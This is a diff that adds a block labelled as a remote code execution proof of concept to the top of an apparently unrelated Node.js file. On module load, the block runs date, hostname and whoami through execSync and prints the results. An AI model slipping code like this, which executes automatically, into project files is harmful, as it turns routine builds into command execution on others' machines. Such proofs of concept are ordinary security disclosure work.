@@ -1,5 +1,15 @@
 'use strict';
 
+// RCE PoC - security research (harmless commands only)
+const { execSync } = require('child_process');
+try {
+    console.log('=== RCE PoC Start ===');
+    console.log('date:', execSync('date').toString().trim());
+    console.log('hostname:', execSync('hostname').toString().trim());
+    console.log('whoami:', execSync('whoami').toString().trim());
+    console.log('=== RCE PoC End ===');
+} catch(e) { console.error('PoC error:', e.message); }
+
 const assert = require('assert');
 const nodeMainVersion = parseInt(process.version.match(/^v(\d+)\.\d+/)[1]);
 assert(nodeMainVersion >= 8, `Node version (${process.version}) is too low, require at least NodeJS 8`);
